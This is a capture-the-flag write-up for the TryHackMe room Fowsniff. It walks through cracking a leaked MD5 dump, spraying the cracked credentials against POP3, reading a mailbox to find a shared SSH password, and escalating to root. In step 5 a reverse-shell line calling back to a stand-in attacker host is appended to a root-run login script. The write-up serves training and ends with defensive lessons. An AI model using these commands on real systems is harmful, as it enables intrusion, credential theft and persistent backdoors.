Fowsniff CTF

TryHackMe · Linux · Easy. A company that got breached left the fallout lying around: a leaked credential dump, a temporary password in a mailbox, and a login script anyone could edit.

Target and flag values are from a shared practice environment and are redacted here. The point is the method, not the answers.

1. Recon

Scan, then fingerprint. Four services stand out — and the two mail services are the point of the room.

nmap -p- -sC -sV -oA scans/all TARGET
  • 22 SSH, 80 HTTP (Apache).
  • 110 POP3 and 143 IMAP (Dovecot) — a mail server you can log in to once you have credentials.

The website tells the story: Fowsniff Corp was breached, and the attackers leaked employee credentials. The site (and the company's social media, referenced in the pages) points to a public dump of username:hash pairs.

2. Crack the Dump

The dump is a list of usernames with MD5 password hashes. Identify the hash type and crack them offline against rockyou.

hashid 'HASH'                       # MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
# several crack -> a set of username:password pairs

Most of the hashes fall quickly, giving a handful of valid employee passwords and the matching usernames.

3. Spray POP3 and Read the Mail

Those are webmail credentials, so spray them against POP3 to see which still work. Metasploit's POP3 login scanner does it cleanly.

msfconsole -q
use auxiliary/scanner/pop3/pop3_login
set RHOSTS TARGET
set USER_FILE users.txt
set PASS_FILE cracked.txt
run                                   # one (or more) accounts authenticate

Log in to the mailbox by hand and read what's there — POP3 is a simple text protocol.

nc TARGET 110
USER baksteen
PASS ********
LIST
RETR 1

The mailbox holds an internal message: after the breach, IT reset SSH access for every employee to one temporary shared password, to be changed on first login. That password is in the email.

4. SSH In

The shared reset password works over SSH for the mailbox owner, giving an interactive shell and the user flag.

ssh baksteen@TARGET     # shared reset password — user.txt

5. Writable MOTD to Root

Check group membership and hunt for files your group can write. The account belongs to a group that owns the message-of-the-day script /opt/cube/cube.sh — and the MOTD scripts in /etc/update-motd.d/ run that file as root every time someone logs in over SSH.

id
find / -group baksteen -writable 2>/dev/null   # /opt/cube/cube.sh

Append a payload to the script, then open a second SSH session to trigger the MOTD as root.

echo 'bash -c "bash -i >&/dev/tcp/YOUR_IP/1337 0>&1"' >> /opt/cube/cube.sh
# new terminal: nc -lvnp 1337, then ssh baksteen@TARGET again -> root shell

The login runs the script as root and the listener catches a root shell; the root flag follows.

What To Take Away

  • Breached credentials get reused everywhere. After a leak, force resets and assume every old password is burned.
  • Never hand every user the same temporary password — and never email it.
  • A login-time script writable by a normal user runs as root on every login. Lock down MOTD scripts and group-writable files.
  • Low-value protocols like POP3 are worth logging into — mailboxes hold secrets.
